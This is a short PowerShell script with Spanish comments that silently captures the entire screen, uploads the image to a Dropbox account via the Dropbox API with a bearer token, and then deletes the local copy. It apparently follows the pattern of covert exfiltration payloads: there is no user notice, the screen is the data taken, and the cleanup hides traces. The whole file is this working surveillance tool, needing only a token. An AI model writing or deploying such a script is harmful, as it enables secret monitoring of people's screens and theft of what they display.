# Definir el token de acceso de Dropbox
$db = ""

# Función para subir archivos a Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )

    # Definir la ruta del archivo en Dropbox
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"

    # Crear la configuración para la subida del archivo
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')

    # Subir el archivo a Dropbox utilizando la API de Dropbox
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Función para capturar la pantalla
function Capture-Screen {
    # Añadir tipos necesarios para capturar la pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Obtener las dimensiones de la pantalla
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

    # Capturar la pantalla completa
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
    $filePath = "$env:temp\sc.png"

    # Guardar la captura de pantalla como un archivo PNG
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $filePath
}

# Bloque principal de ejecución
try {
    # Capturar la pantalla y obtener la ruta del archivo de captura
    $screenshotPath = Capture-Screen

    # Subir la captura de pantalla a Dropbox si el token de acceso está disponible
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -f $screenshotPath
    } else {
        Write-Error "No se proporcionó el token de acceso de Dropbox."
    }

    # Limpiar el archivo de captura de pantalla
    Remove-Item -Path $screenshotPath -Force
}
catch {
    # Manejar cualquier error que ocurra durante el proceso
    Write-Error "Ocurrió un error: $_"
}
